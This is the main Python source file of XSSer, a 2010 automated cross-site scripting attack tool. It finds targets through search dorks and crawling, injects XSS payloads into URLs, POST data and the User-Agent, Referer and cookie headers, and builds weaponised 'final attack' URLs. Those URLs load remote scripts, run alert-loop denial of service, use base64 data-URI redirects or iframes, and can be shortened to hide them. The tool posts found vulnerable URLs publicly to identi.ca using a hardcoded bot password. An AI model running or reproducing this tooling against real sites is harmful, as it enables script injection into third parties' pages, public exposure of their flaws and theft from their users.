#!/usr/bin/python
# -*- coding: iso-8859-15 -*-
"""
$Id$

This file is part of the xsser project, http://xsser.sourceforge.net.

Copyright (c) 2010 psy <root@lordepsylon.net>

xsser is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 3 of the License.

xsser is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with xsser; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import re, sys, datetime, hashlib
import traceback
import webbrowser
import fuzzing
import fuzzing.vectors
import fuzzing.DCP
from curlcontrol import Curl
from encdec import EncoderDecoder
from options import XSSerOptions
from dork import Dorker
from crawler import Crawler
from post.shorter import ShortURLReservations
from imagexss import ImageInjections
from flashxss import FlashInjections
from publish import publisher
from post.xml_exporter import xml_reporting

# set to emit debug messages about errors.
DEBUG = 1

class XSSer(EncoderDecoder):
    """
    XSSer application class
    """
    def __init__(self):
        # initialize the url encoder/decoder
        EncoderDecoder.__init__(self)

        # your unique real opponent
        self.time = datetime.datetime.now()

        # this payload comes with vector already..
        #self.DEFAULT_XSS_PAYLOAD = '"><img src=x onerror=alert("XSS");>'
        self.DEFAULT_XSS_PAYLOAD = '"><script>alert("XSS")</script>'

        # to be or not to be...
        self.hash_found = []
        self.hash_notfound = []

        # other hashes
        self.hashed_payload = []
        self.url_orig_hash = []

        # some counters for injections founded
        self.xsr_founded = 0
        self.xsa_founded = 0
        self.coo_founded = 0
        self.manual_founded = 0
        self.auto_founded = 0
        self.dcp_founded = 0
        self.check_founded = 0

        # xsser verbosity (0 - no output, 1 - dots only, 2+ - real verbosity)
        self.verbose = 2
        self.options = None

	# define some statistics counters  
        self.success_connection = 0
        self.not_connection = 0
        self.forwarded_connection = 0
        self.other_connection = 0
        self.total_vectors = 0
        self.special_vectors = 0
        self.check_positives = 0
        self.false_positives = 0

    def generate_hash(self, attack_type='default'):
        """
        generate a new hash for a type of attack.
        """
        return hashlib.md5(str(datetime.datetime.now()) + attack_type).hexdigest()

    def report(self, msg, level='info'):
        """
        Report some error from the application.

        levels: debug, info, warning, error
        """
        if self.verbose == 2:
            prefix = ""
            if level != 'info':
                prefix = "["+level+"] "
            print msg
        elif self.verbose:
            if level == 'error':
                sys.stdout.write("*")
            else:
                sys.stdout.write(".")

    def set_options(self, options):
        """
        Set xsser options
        """
        self.options = options
        self._opt_request()

    def _opt_request(self):
        """
        Pass on some properties to Curl
        """
        options = self.options
        for opt in ['cookie', 'agent', 'referer',\
			'headers', 'atype', 'acred',
			'proxy', 'timeout', 'delay',
			'threads', 'retries'
			]:
            if hasattr(options, opt) and getattr(options, opt):
                setattr(Curl, opt, getattr(options, opt))

    # attack functions
    def get_payloads(self):
        """
        Process payload options and make up the payload list for the attack.
        """
        options = self.options
	# payloading sources
        payloads_fuzz = fuzzing.vectors.vectors
        payloads_dcp = fuzzing.DCP.DCPvectors
        manual_payload = [{"payload":options.script, "browser":"[you know, is your injection :-P]"}]
        # sustitute payload for hash to check false positives
        self.hashed_payload = self.generate_hash('url')
        checker_payload = [{"payload":self.hashed_payload, "browser":"[hashed pre-checking injection process]"}]

        if options.fuzz:
            payloads = payloads_fuzz
            if options.dcp:
                payloads = payloads + payloads_dcp
                if options.script:
                    payloads = payloads + manual_payload
            elif options.script:
                payloads = payloads + manual_payload
        elif options.dcp:
            payloads = payloads_dcp
            if options.script:
                payloads = payloads + manual_payload
        elif options.script:
            payloads = manual_payload
        else:
            payloads = [{"payload":self.DEFAULT_XSS_PAYLOAD,
			 "browser":"[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"
                         }]  
        if options.check:
            if options.fuzz:
                payloads = checker_payload + payloads_fuzz
            elif options.dcp:
                payloads = checker_payload + payloads_dcp
            elif options.script:
                payloads = checker_payload + manual_payload
            else:
                payloads = checker_payload
        return payloads

    def process_ipfuzzing(self, text):
        """
        Mask ips in given text to DWORD
        """
        ips = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", text)
        for ip in ips:
            text = text.replace(ip, str(self._ipDwordEncode(ip)))
        return text

    def process_ipfuzzing_octal(self, text):
        """
       	Mask ips in given text to Octal
	    """
        ips = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", text)
        for ip in ips:
            text = text.replace(ip, str(self._ipOctalEncode(ip)))
        return text

    def process_payloads_ipfuzzing(self, payloads):
        """
        Mask ips for all given payloads using DWORD
        """
        # ip fuzzing (DWORD)
        if self.options.Dwo:
            resulting_payloads = []
            for payload in payloads:
                payload["payload"] = self.process_ipfuzzing(payload["payload"])
                resulting_payloads.append(payload)
            return resulting_payloads
        return payloads

    def process_payloads_ipfuzzing_octal(self, payloads):
        """
        Mask ips for all given payloads using OCTAL
        """
        # ip fuzzing (OCTAL)
        if self.options.Doo:
            resulting_payloads = []
            for payload in payloads:
                payload["payload"] = self.process_ipfuzzing_octal(payload["payload"])
                resulting_payloads.append(payload)
            return resulting_payloads
        return payloads

    def get_query_string(self):
        """
        Get the supplied query string.
        """
        if self.options.postdata:
            return self.options.postdata
        elif self.options.getdata:
            return self.options.getdata
        return ""

    def attack_url(self, url, payloads, query_string):
        """
        Attack the given url.
        """
        for payload in payloads:
            self.attack_url_payload(url, payload, query_string)
            self.total_vectors = self.total_vectors + 1

    def get_url_payload(self, url, payload, query_string, attack_payload=None):
        """
        Attack the given url with the given payload
        """
        options = self.options
        self._ongoing_attacks = {}

        # get payload/vector
        payload_string = payload['payload'].strip()
        # substitute the attack hash
        self.url_orig_hash = self.generate_hash('url')
        hashed_payload = payload_string.replace('XSS', self.url_orig_hash)
        if attack_payload:
            # url for real attack
            hashed_vector_url = self.encoding_permutations(attack_payload)
        else:
            # test
            hashed_vector_url = self.encoding_permutations(hashed_payload)

        self._ongoing_attacks['url'] = hashed_payload

        if 'PAYLOAD' in url:
            # this url comes with vector included
            dest_url = url.strip().replace('PAYLOAD', hashed_vector_url)
        else:
            payload_url = query_string.strip() + hashed_vector_url
            dest_url = url.strip() + "/" + payload_url
        return dest_url

    def attack_url_payload(self, url, payload, query_string):

        c= Curl()
        try:
            if self.options.getdata or not self.options.postdata:
                dest_url = self.get_url_payload(url, payload, query_string)
                self._prepare_extra_attacks()
                c.get(dest_url)
            if self.options.postdata:
                dest_url = self.get_url_payload("", payload, query_string)
                dest_url = dest_url.strip().replace("/", "", 1)
                c.post(url, dest_url)
        except:
            if DEBUG:
                self.report("")
                traceback.print_exc()
            self.report("\nTraceback (failed attempt): " + "\n\n" + dest_url, "error")
            c.close()
            return

        if c.info()["http-code"] == "200":
            if self.options.statistics:
                self.success_connection = self.success_connection + 1

            self._report_attack_success(c, dest_url, payload,
                                        query_string, url)
        else:
            self._report_attack_failure(c, dest_url, payload,
                                        query_string, url)
        c.close()

    def encoding_permutations(self, enpayload_url):
        """
        Perform encoding permutations on the url and query_string.
        """
        options = self.options
        if options.Cem: 
            enc_perm = options.Cem.split(",")
            for _enc in enc_perm:
                enpayload_url   = self.encmap[_enc](enpayload_url)
        else: 
            for enctype in self.encmap.keys():
                if getattr(options, enctype):
                    enpayload_url   = self.encmap[enctype](enpayload_url)
        return enpayload_url

    def _report_attack_success(self, curl_handle, dest_url, payload,\
                               query_string, orig_url):
        """
        report success of an attack
        """
        options = self.options
        self.report("-"*25)
        self.report("[-] \033[1;31mHashing:\033[1;m " + self.url_orig_hash)
        self.report("[+] \033[1;33mTrying:\033[1;m " + dest_url.strip(), 'info')
        self.report("[+] \033[1;35mBrowser Support:\033[1;m " + payload['browser'])

        if options.verbose:
            self.report("[-] \033[1;36mHeaders Results:\033[1;m\n")
            self.report(curl_handle.info())
            self.report("[-] \033[1;31mInjection Results:\n\033[1;m")

        # check attacks success
        for attack_type in self._ongoing_attacks:
            hashing = self._ongoing_attacks[attack_type]
            if hashing in curl_handle.body():
                self.add_success(dest_url, payload, hashing, query_string, orig_url, attack_type)
            else:
                self.add_failure(dest_url, payload, hashing, query_string, attack_type)

    def add_failure(self, dest_url, payload, hashing, query_string, method='url'):
        """
        Add an attack that failed to inject
        """
        self.report("[+] \033[1;36mChecking:\033[1;m " + method + " attack with " + hashing + "... fail")
        options = self.options
        if options.script:
            self.hash_notfound.append((dest_url, "Manual injection", method, hashing))
        else:
            self.hash_notfound.append((dest_url, payload['browser'], method, hashing))
        if options.verbose:
            self.report("Searching hash: " + hashing + " in target source code...\n")
            self.report("Injection failed!. Hash not found...\n")

    def add_success(self, dest_url, payload, hashing, query_string, orig_url, method='url'):
        """
        Add an attack that managed to inject the code
        """
        self.report("[+] \033[1;36mChecking:\033[1;m " + method + " attack with " + hashing + "... ok")
        self.hash_found.append((dest_url, payload['browser'], method, hashing, query_string, payload, orig_url))

        if self.options.verbose:
            self.report("Searching hash: " + hashing + " in target source code...\n")
            self.report("Looks that this injection was a success!! :)\n")

    def _report_attack_failure(self, curl_handle, dest_url, payload,\
                               attack_vector, orig_url):
        """
        report failure of an attack
        """
        options = self.options
        self.hash_notfound.append((dest_url, payload['browser'], "errorcode"))
        self.report("-"*45)
        self.report("[-] \033[1;31mHashing:\033[1;m " + self.url_orig_hash)
        self.report("[+] \033[1;33mTrying:\033[1;m " + dest_url.strip())
        self.report("[+] \033[1;35mBrowser Support:\033[1;m " + payload['browser'])

        if options.verbose:
            self.report("[-] \033[1;36mHeaders Results:\033[1;m\n")
            self.report(str(curl_handle.info()))

            self.report("[-] \033[1;36mInjection Results:\033[1;m")

        self.report("Not injected!. Servers response with http-code different to: 200 OK (" + str(curl_handle.info()["http-code"]) + ")")

        if self.options.statistics:
            if str(curl_handle.info()["http-code"]) == "400":
                self.not_connection = self.not_connection + 1
            elif str(curl_handle.info()["http-code"]) == "503":
                self.forwarded_connection = self.forwarded_connection + 1
            else:
                self.other_connection = self.other_connection + 1

    def check_positive(self, curl_handle, dest_url, payload, attack_vector):
        """
        Perform extra check for positives
        """
        body = curl_handle.body()
        # should check ongoing_attacks here
        # perform extra checks
        pass

    def create_options(self):
        """
        Create the program options for OptionParser.
        """
        self.optionParser = XSSerOptions()
        self.options = self.optionParser.get_options()
        if not self.options:
            return False
        return self.options

    def _get_attack_urls(self):
        """
        Process payload options and make up the payload list for the attack.
        """
        options = self.options
        p = self.optionParser
        if options.imx:
            self.create_fake_image(options.imx, options.script)
            sys.exit()

        if options.flash:
            self.create_fake_flash(options.flash, options.script)
            sys.exit()

        if options.url:
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("Testing [\033[1;33mXSS from URL\033[1;m] injections...good luck ;)")
            self.report('='*75)
            urls = [options.url]

        elif options.readfile:
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("Testing [\033[1;33mXSS from file\033[1;m] injections...good luck ;)")
            self.report('='*75)

            #XXX: need to check if the file have a valid data.
            f = open(options.readfile)
            urls = f.readlines()
            urls = [ line.replace('\n','') for line in urls ]
            f.close()

        elif options.dork:
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("Testing [\033[1;33mXSS from Dork\033[1;m] injections...good luck ;)")
            self.report('='*75)
            dorker = Dorker(options.dork_engine)
            urls = dorker.dork(options.dork)

        if options.crawling:
            crawler_urls = []
            crawler = Crawler(curlwrapper=Curl)
            if options.crawler_width:
                if options.crawler_width.isdigit():
                    crawler_width = int(options.crawler_width)
                else:
                    crawler_width = 0
            else:
                crawler_width = 0
            for url in urls:
                crawler_urls += crawler.crawl(url,
                                              int(options.crawling),
                                              crawler_width)
            return crawler_urls
        
        if not options.imx or not options.flash:
            return urls

    def try_running(self, func, error, args=[]):
        """
        Try running a function and print some error if it fails and exists with
        a fatal error.
        """
        try:
            return func(*args)
        except Exception, e:
            self.report(error, "error")
            self.report(str(e.message), "error")
            if DEBUG:
                traceback.print_exc()
            sys.exit()

    def create_fake_image(self, filename, payload):
        """
        Create -fake- image with code injected
        """
        options = self.options
        filename = options.imx
        payload = options.script
        image_xss_injections = ImageInjections()
        image_injections = image_xss_injections.image_xss(options.imx , options.script)
        return image_injections

    def create_fake_flash(self, filename, payload):
        """
	    Create -fake- flash movie (.swf) with code injected
    	"""
        options = self.options
        filename = options.flash
        payload = options.script
        flash_xss_injections = FlashInjections()
        flash_injections = flash_xss_injections.flash_xss(options.flash, options.script)
        return flash_injections

    def run(self):
        """
        Run xsser.
        """
        options = self.options
        # step 0: third party tricks
        if options.imx: # create -fake- image with code injected
            p = self.optionParser
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("[\033[1;33mImage XSS auto-builder\033[1;m]...remember, only IE6 and below versions ;)")
            self.report('='*75)
            self.report(''.join(self.create_fake_image(self.options.imx, self.options.script)))
            self.report('='*75 + "\n")

        if options.flash: # create -fake- flash movie (.swf) with code injected
            p = self.optionParser
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("[\033[1;33mFlash Attack! XSS auto-builder\033[1;m]...ready to be embedded ;)")
            self.report('='*75)
            self.report(''.join(self.create_fake_flash(self.options.flash, self.options.script)))
            self.report('='*75 + "\n")

        # step 1: get urls
        urls = self.try_running(self._get_attack_urls, "\n[I] Internal error getting -targets-. look at the end of this Traceback to see whats wrong:")
        # step 2: get payloads
        payloads = self.try_running(self.get_payloads, "\n[I] Internal error getting -payloads-.")
        if options.Dwo:
            payloads = self.process_payloads_ipfuzzing(payloads)
        elif options.Doo:
            payloads = self.process_payloads_ipfuzzing_octal(payloads)
        # step 3: get query string
        query_string = self.try_running(self.get_query_string, "\nInternal error getting query -string-.")
        # step 4: print curl options if requested
        if options.verbose:
            Curl.print_options()
        # step 5: perform attack
        self.try_running(self.attack, "\nInternal error running attack", (urls, payloads, query_string))
        # step 6: print results
        if options.filexml:
            xml_report_results = xml_reporting(self)
            xml_report_results.print_xml_results(self.options.filexml)
	# step 7: publish on social networking sites (identica)
	# Edit username/password
	# to create your own bot
        if options.tweet and self.hash_found:
            for line in self.hash_found:
                sns_publish_results = publisher(self)
                # remember, microblogging limit (140 caracters)
                msg = '#xss ' + str(line[0])
                if len(msg) > 140:
                    msg = '#xss ' + str(line[6]) + str(line[4])
		# identi.ca don't supports url shorters for free, who show all attack url complete. so > 140 caracters = vector hidden.
                service = 'http://identi.ca'
                username = 'xsserbot01'
                password = '8vnVw8wvs'
                url = 'http://identi.ca/api/statuses/update.xml'
                sns_publish_results.send_to_identica(msg, username, password, url)
        self.print_results()

    def _prepare_extra_attacks(self):
        """
        Setup extra attacks.
        """
        options = self.options
        if options.xsa:
            hashing = self.generate_hash('xsa')
            Curl.agent = "<script>alert('" + hashing + "')</script>"
            self._ongoing_attacks['xsa'] = hashing
            self.special_vectors = self.special_vectors + 1

        if options.xsr:
            hashing = self.generate_hash('xsr')
            Curl.referer = "<script>alert('" + hashing + "')</script>"
            self._ongoing_attacks['xsr'] = hashing
            self.special_vectors = self.special_vectors + 1

        if options.coo:
            hashing = self.generate_hash('cookie')
            Curl.cookie = "<script>alert('" + hashing + "')</script>"
            self._ongoing_attacks['cookie'] = hashing
            self.special_vectors = self.special_vectors + 1

    def attack(self, urls, payloads, query_string):
        """
        Perform an attack on the given urls, with the provided payloads and
        query_string.
        """
        for url in urls:
            self.report("\n"+'='*75)
            self.report("\033[1;34mTarget:\033[1;m " + url + " \033[1;34m-->\033[1;m " + str(self.time))
            self.report('='*75 + "\n")
            self.attack_url(url, payloads, query_string)

    def generate_real_attack_url(self, dest_url, description, method, hashing, query_string, payload, orig_url):
        """
        Generate a real attack url, by using data from a successfull test run, but setting
	a real attack payload using or not, special techniques.

	This method also applies DOM stealth mechanisms.
        """
        user_attack_payload = payload["payload"]
        if self.options.finalpayload:
            user_attack_payload = self.options.finalpayload
        elif self.options.finalremote:
            user_attack_payload = '<script src="' + self.options.finalremote + '"></script>'
        if self.options.dos:
            user_attack_payload = '<script>for(;;)alert("You was XSSed!!");</script>'
        if self.options.b64:
            user_attack_payload = '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4">'
        if self.options.onm:
            user_attack_payload = '"style="position:absolute;top:0;left:0;z-index:1000;width:3000px;height:3000px" onMouseMove="' + user_attack_payload
        if self.options.ifr:
            user_attack_payload = '<iframe src="' + user_attack_payload + '"></iframe>'

        do_anchor_payload = self.options.anchor
        anchor_data = None
        if do_anchor_payload:
            dest_url = self.get_url_payload(orig_url, payload, query_string, user_attack_payload)
            dest_url = dest_url.replace('?', '#')
        else:
            dest_url = self.get_url_payload(orig_url, payload, query_string, user_attack_payload)
        return dest_url

    def apply_postprocessing(self, dest_url, description, method, hashing, query_string, payload, orig_url):
        real_attack_url = self.generate_real_attack_url(dest_url, description, method, hashing, query_string, payload, orig_url)
        generate_shorturls = self.options.shorturls
        if generate_shorturls:
            shortener = ShortURLReservations(self.options.shorturls)
            shorturl = shortener.process_url(real_attack_url)
            if self.options.finalpayload or self.options.finalremote or self.options.b64 or self.options.dos:
                print "[/] Shortered URL (Final Attack):",  "\033[1;36m" + shorturl + "\033[1;m"
            else:
                print "[/] Shortered URL (Injection):",  "\033[1;36m" + shorturl + "\033[1;m"
        return real_attack_url

    def print_results(self):
        """
        Print results from an attack.
        """
	# some exits for some bad situations:
        if len(self.hash_found) + len(self.hash_notfound) == 0 and not Exception:
            print "\n[I] I cannot send data :( ... maybe is -something- blocking our connections!?\n"
            sys.exit()
        if len(self.hash_found) + len(self.hash_notfound) == 0 and self.options.crawling:
            print "\n[I] Crawlering system cannot recieve feedback from 'spiders' on target host... try again :(\n"
            sys.exit()
        print '\n' + '='*75
        print "[*] \033[1;37mFinal Results:\033[1;m"
        print '='*75 + '\n'
        total_injections = len(self.hash_found) + len(self.hash_notfound)
        print "- Injections:", total_injections
        print "- Failed:", len(self.hash_notfound)
        print "- Sucessfull:", len(self.hash_found)
        try:
            _accur = len(self.hash_found) * 100 / total_injections
        except ZeroDivisionError:
            _accur = 0
        print "- Accur: %s %%\n" % _accur
        if not len(self.hash_found) and self.hash_notfound:
            print '='*75 + '\n'
            pass
        else:
            print '='*75
            print "[*] \033[1;37mList of possible XSS injections:\033[1;m"
            print '='*75 + '\n'

        for line in self.hash_found: 
            attack_url = self.apply_postprocessing(line[0], line[1], line[2], line[3], line[4], line[5], line[6])
            if line[2] == "xsr":
                self.xsr_founded = self.xsr_founded + 1
                xsr_vulnerable_host = [{"payload":str(line[4]), "target":str(line[6])}]  
                if xsr_vulnerable_host[0]["payload"] == line[4] and xsr_vulnerable_host[0]["target"] == line[6] and self.xsr_founded > 1:
                    pass
                else:
                    print "[I] Target:", "\033[1;33m", line[6] ,"\033[1;m"
                    print "[+] Injection (xsr):","\033[1;34m",str(line[6])+"/"+str(line[4]),"\033[1;m"
                    print "[!] Special:", "Cross Site Referer Scripting!!", "[",Curl.referer,"]"
                    print '-'*50, "\n"
            elif line[2] == "xsa":
                self.xsa_founded = self.xsa_founded + 1
                xsa_vulnerable_host = [{"payload":str(line[4]), "target":str(line[6])}]
                if xsa_vulnerable_host[0]["payload"] == line[4] and xsa_vulnerable_host[0]["target"] == line[6] and self.xsa_founded > 1:
                    pass
                else:
                    print "[I] Target:", "\033[1;33m", line[6] ,"\033[1;m"
                    print "[+] Injection (xsa):","\033[1;34m",str(line[6])+"/"+str(line[4]),"\033[1;m"
                    print "[!] Special:", "Cross Site Agent Scripting!!", "[", Curl.agent, "]"
                    print '-'*50, "\n"
            elif line[2] == "coo":
                self.coo_founded = self.coo_founded + 1
                coo_vulnerable_host = [{"payload":str(line[4]), "target":str(line[6])}]
                if coo_vulnerable_host[0]["payload"] == line[4] and coo_vulnerable_host[0]["target"] == line[6] and self.coo_founded > 1:
                    pass
                else:
                    print "[I] Target:", "\033[1;33m", line[6] ,"\033[1;m"
                    print "[+] Injection (coo):","\033[1;34m",str(line[6])+"/"+str(line[4]),"\033[1;m"
                    print "[!] Special:", "Cross Site Cookie Scripting!!", "[", Curl.cookie, "]"
                    print '-'*50, "\n"
            else:
                print "[I] Target:", "\033[1;33m", line[6] ,"\033[1;m"
                print "[+] Injection:","\033[1;34m",line[0],"\033[1;m"
            if self.options.check and self.hash_found and line[2] == "url" and line[5]["browser"] == "[hashed pre-checking injection process]":
                print "[!] Checker: This injection looks like a -false positive- result!. Verify it manually."
                self.false_positives = self.false_positives + 1

            if self.options.dcp and not self.options.fuzz and not self.options.script:
                print "[!] DCP Injection:", line[5]["payload"]
                if self.options.finalpayload or self.options.finalremote or self.options.b64 or self.options.dos:
                    print "[*] Final Attack: You cannot use a Data Control Protocol (DCP) flaw to inject other type of code."
            else:
                if self.options.finalpayload or self.options.finalremote or self.options.b64 or self.options.dos:
                    print "[*] Final Attack:", "\033[1;35m",attack_url,"\033[1;m"

            if line[2] == "xsr" or line[2] == "xsa" or line[2] == "coo":
                pass
            else:
                print "[-] Method:", line[2]
                print "[-] Browsers:", line[1],  "\n", '-'*50, "\n"

            if self.options.tweet:
            # XXX needs recover sns and username automatically
                print "[!] Published on: " + "http://identi.ca/" + "xsserbot01"
            # adding positive results to counters
            # XXX needs verify sources better than using browser info
            if self.options.dcp and str(line[1]) == "[Data Control Protocol Injection]":
                self.dcp_founded = self.dcp_founded + 1
            elif self.options.script and str(line[1]) == "[you know, is your injection :-P]":
                self.manual_founded = self.manual_founded + 1
            else:
                self.auto_founded = self.auto_founded + 1
            # output results to file	
            if self.options.fileoutput:
                fout = open("XSSlist.dat", "a")
                if line[2] == "xsr":
                    xsr_vulnerable_host = [{"payload":str(line[4]), "target":str(line[6])}]
                    if xsr_vulnerable_host[0]["payload"] == line[4] and xsr_vulnerable_host[0]["target"] == line[6] and self.xsr_founded > 1:
                        pass
                    else:
                        fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                        fout.write("---------------------" + "\n")
                        fout.write("[I] Target: " + line[6] + "\n")
                        fout.write("[+] Injection: "+ str(line[6])+"/"+str(line[4]) + "\n")
                        fout.write("[!] Special: "+ "Cross Site Referer Scripting!! " + "[" + Curl.referer + "]" + "\n")
                elif line[2] == "xsa":
                    xsa_vulnerable_host = [{"payload":str(line[4]), "target":str(line[6])}]
                    if xsa_vulnerable_host[0]["payload"] == line[4] and xsa_vulnerable_host[0]["target"] == line[6] and self.xsa_founded > 1:
                        pass
                    else:
                        fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                        fout.write("---------------------" + "\n")
                        fout.write("[I] Target: " + line[6] + "\n")
                        fout.write("[+] Injection: "+ str(line[6])+"/"+str(line[4]) + "[" + Curl.agent + "]" + "\n")
                        fout.write("[!] Special: " + "Cross Site Agent Scripting!! " + "\n")
                elif line[2] == "coo":
                    coo_vulnerable_host = [{"payload":str(line[4]), "target":str(line[6])}]
                    if coo_vulnerable_host[0]["payload"] == line[4] and coo_vulnerable_host[0]["target"] == line[6] and self.coo_founded > 1:
                        pass
                    else:
                        fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                        fout.write("---------------------" + "\n")
                        fout.write("[I] Target: " + line[6] + "\n")
                        fout.write("[+] Injection: "+ str(line[6])+"/"+str(line[4]) + "[" + Curl.cooki + "]" + "\n")
                        fout.write("[!] Special: " + "Cross Site Cookie Scripting!! " + "\n")
                else:
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("---------------------" + "\n")
                    fout.write("[I] Target: " + line[6] + "\n")
                    fout.write("[+] Injection: "+ line[0] + "\n")
                if self.options.check and self.hash_found and line[2] == "url" and line[5]["browser"] == "[hashed pre-checking injection process]":
                    fout.write("[!] Checker: This injection looks like a -false positive- result!. Verify it manually." + "\n")
                if self.options.dcp and not self.options.fuzz and not self.options.script:
                    fout.write("[!] DCP Injection: " + line[5]["payload"] + "\n")
                    if self.options.finalpayload or self.options.finalremote or self.options.b64 or self.options.dos:
                        fout.write("[*] Final Attack: You cannot use a Data Control Protocol (DCP) flaw to inject other type of code." + "\n")
                    else:
                        if self.options.finalpayload or self.options.finalremote or self.options.b64 or self.options.dos:
                            fout.write("[*] Final Attack: " + attack_url +"\n")
                if line[2] == "xsr" or line[2] == "xsa" or line[2] == "coo":
                    pass
                else:
                    fout.write("[-] Method: "+ line[2] + "\n")
                    fout.write("[-] Browsers:"+ line[1]+ "\n")
                    fout.write("="*75 + "\n")
                if self.options.tweet:
                # XXX needs recover sns and username automatically
                    fout.write("[!] Published on: " + "http://identi.ca/" + "xsserbot01" + "\n")
                    fout.write("="*75 + "\n")

	# some statistics reports
        if self.options.statistics:
            print '='*75
            print "[*] \033[1;37mStatistics:\033[1;m"
            print '='*75
            test_time = datetime.datetime.now() - self.time
            print '-'*50
            print "Test Time Duration: ", test_time
            print '-'*50  
            total_connections = self.success_connection + self.not_connection + self.forwarded_connection + self.other_connection
            print "Total Connections:", total_connections
            print '-'*25
            print "200-OK:" , self.success_connection , "|",  "400:" , self.not_connection , "|" , "503:" , self.forwarded_connection , "|" , "Others:", self.other_connection
            try:
                _accur = self.success_connection * 100 / total_connections
            except ZeroDivisionError:
                _accur = 0
            print "Connec: %s %%" % _accur
            print '-'*50
            vectors = self.total_vectors - self.false_positives
            if vectors < 0:
                vectors = 0
            else:
                vectors = vectors
            total_payloads = self.false_positives + vectors + self.special_vectors
            print "Total Payloads:", total_payloads
            print '-'*25
            print "Checkers:", self.false_positives,  "|" , "Vectors:" , vectors , "|" , "Specials:" , self.special_vectors
            print '-'*50
            print "Total Injections:" , len(self.hash_notfound) + len(self.hash_found)
            print '-'*25
            print "Failed:" , len(self.hash_notfound), "|", "Sucessfull:" , len(self.hash_found) 
            try:
                _accur = len(self.hash_found) * 100 / total_injections
            except ZeroDivisionError:
                _accur = 0
            print "Accur: %s %%" % _accur
            print '-'*25
            print "Founded = ", "Manual:", self.manual_founded, "|", "Auto:", self.auto_founded, "|", "DCP:", self.dcp_founded, "|" , "XSR:", self.xsr_founded, "|", "XSA:", self.xsa_founded, "|", "COO:", self.coo_founded
            print '-'*50
            print "False positives:", self.false_positives, "|", "Vulnerables:", (len(self.hash_found) - self.false_positives)
            print '-'*25
	    # efficiency ranking:
	    # algor= vulnerables + false positives - failed * extras
	    # extras: 
	    ## 1 vuln -> identi.ca: +10000
	    ## >3 vuln -> 1 test: +4500
	    ## 1 vuln -> 1 test: +500 
	    ## >100 payloads: +150
	    ## proxy: +100
	    ## final payload injected: +100
	    ## --Cem and --Doo: +75
	    ## manual payload injected and --Dcp: +25
	    ## checker: +10
            mana = 0
            if self.hash_found and self.options.tweet:
                mana = mana + 10000
            if self.hash_found > 3:
                mana = mana + 4500
            if self.hash_found == 1:
                mana = mana + 500
            if total_payloads > 100:
                mana = mana + 150
            if self.options.proxy:
                mana = mana + 100
            if self.options.finalpayload or self.options.finalremote:
                mana = mana + 100
            if self.options.Cem or self.options.Doo:
                mana = mana + 75
            if self.options.script and not self.options.fuzz:
                mana = mana + 25
            if self.options.dcp:
                mana = mana + 25
            if self.options.check:
                mana = mana + 10
            mana = (len(self.hash_found) * mana) + mana -4500
            # enjoy it :)
            print "Mana:", mana
            print '='*75 + '\n'

            if self.options.launch_browser:
                if self.options.dcp:
                    #XXX implement DCP autolauncher
                    print "\n[@] DCP autolauncher not implemented, yet. (http://docs.python.org/library/webbrowser.html)"
                    print "[!] Aborting all launching process!!. If you want to 'auto-launch' other results, try without --Dcp option\n"
                    print "[I] If you have some DCP success injections discovered, try to open -manually- these results (white color) in the website of your target. You will see that works! ;)\n"
                else:
                    webbrowser.open(attack_url)

        if not len(self.hash_found) and self.hash_notfound:
            if self.options.check:
                print "[!] Checker: looks like your target(s) don't repeats all code received. Is good a scenario for XSSer injections...\n"
                self.check_founded = self.check_founded + 1
                if self.options.fuzz or self.options.dcp or self.options.script:
                    print "[I] Could not find any vulnerability!. Try another combination or hack it -manually- :)\n"
            else:
                print "[I] Could not find any vulnerability!. Try another combination or hack it -manually- :)\n"
            print '='*75 + '\n'
            if self.options.fileoutput:
                fout = open("XSSlist.dat", "a")
                fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                fout.write("---------------------" + "\n")
                fout.write("[!] Not reported 'positive' results for: \n" + "[-] " + str('\n[-] '.join([u[0] for u in self.hash_notfound])) + "\n")
                fout.write("="*75 + "\n")
                fout.close()

if __name__ == "__main__":
    app = XSSer()
    options = app.create_options()
    if not options:
        sys.exit()
    app.set_options(options)
    app.run()
